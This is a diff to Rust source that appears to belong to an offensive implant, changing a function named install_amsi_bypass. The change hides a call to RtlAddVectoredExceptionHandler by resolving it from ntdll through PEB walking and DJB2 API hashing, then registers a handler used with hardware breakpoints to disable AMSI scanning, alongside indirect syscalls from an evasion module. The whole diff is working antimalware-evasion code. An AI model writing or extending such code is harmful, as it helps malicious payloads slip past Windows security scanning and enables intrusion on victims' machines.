@@ -1,11 +1,10 @@
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
     Foundation::EXCEPTION_SINGLE_STEP,
-    System::Diagnostics::Debug::{
-        AddVectoredExceptionHandler, EXCEPTION_POINTERS,
-        CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
-    },
+    System::Diagnostics::Debug::{EXCEPTION_POINTERS, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64},
 };
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+use windows_sys::Win32::System::Diagnostics::Debug::AddVectoredExceptionHandler;
 
 #[cfg(target_os = "windows")]
 static mut AMSI_ADDR: usize = 0;
@@ -60,6 +59,17 @@ pub unsafe fn install_amsi_bypass() {
     };
 
     use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    #[cfg(target_arch = "x86_64")]
+    {
+        use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
+        if let Some(fn_ptr) = resolve_by_hash(ntdll, djb2_hash(b"RtlAddVectoredExceptionHandler")) {
+            type RtlVeh = unsafe extern "system" fn(usize, *const core::ffi::c_void) -> *mut core::ffi::c_void;
+            let f: RtlVeh = core::mem::transmute(fn_ptr);
+            f(1, amsi_veh_handler as usize as *const core::ffi::c_void);
+        }
+    }
+    #[cfg(not(target_arch = "x86_64"))]
     AddVectoredExceptionHandler(1, Some(amsi_veh_handler));
 
     let thread: isize = !1isize; // -2 = current thread pseudo-handle
